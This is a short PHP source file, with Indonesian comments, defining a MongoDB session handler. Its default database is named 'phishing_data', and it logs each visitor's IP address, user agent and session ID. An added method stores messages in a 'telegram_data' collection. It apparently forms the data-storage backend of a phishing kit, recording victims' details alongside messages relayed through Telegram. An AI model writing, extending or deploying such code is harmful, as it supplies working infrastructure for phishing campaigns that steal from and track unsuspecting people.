<?php
require_once __DIR__ . '/db_config.php';
require_once __DIR__ . '/../vendor/autoload.php'; // Pastikan MongoDB PHP Library sudah terinstall via Composer

use MongoDB\Client;
use MongoDB\BSON\UTCDateTime;

class MongoDBSessionHandler implements SessionHandlerInterface
{
    private $collection;
    private $telegram_collection;
    
    public function __construct($connectionString, $dbName = 'phishing_data', $collectionName = 'sessions') {
        $client = new Client($connectionString);
        $this->collection = $client->selectDatabase($dbName)->selectCollection($collectionName);
        $this->telegram_collection = $client->selectDatabase($dbName)->selectCollection('telegram_data');
    }

    public function open($savePath, $sessionName) {
        return true;
    }

    public function close() {
        return true;
    }

    public function read($id) {
        $session = $this->collection->findOne(['_id' => $id]);
        if ($session && isset($session['data'])) {
            return $session['data'];
        }
        return '';
    }

    public function write($id, $data) {
        $this->collection->updateOne(
            ['_id' => $id],
            [
                '$set' => [
                    'data' => $data, 
                    'lastAccess' => new UTCDateTime(time() * 1000),
                    'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
                    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
                ]
            ],
            ['upsert' => true]
        );
        return true;
    }

    public function destroy($id) {
        $this->collection->deleteOne(['_id' => $id]);
        return true;
    }

    public function gc($maxlifetime) {
        $cutoff = new UTCDateTime((time() - $maxlifetime) * 1000);
        $this->collection->deleteMany(['lastAccess' => ['$lt' => $cutoff]]);
        return true;
    }
    
    // Fungsi tambahan untuk menyimpan data ke koleksi telegram
    public function saveTelegramData($message, $additionalData = []) {
        $data = [
            'message' => $message,
            'timestamp' => new UTCDateTime(time() * 1000),
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'session_id' => session_id()
        ];
        
        // Tambahkan data tambahan jika ada
        if (!empty($additionalData)) {
            $data = array_merge($data, $additionalData);
        }
        
        $this->telegram_collection->insertOne($data);
    }
}
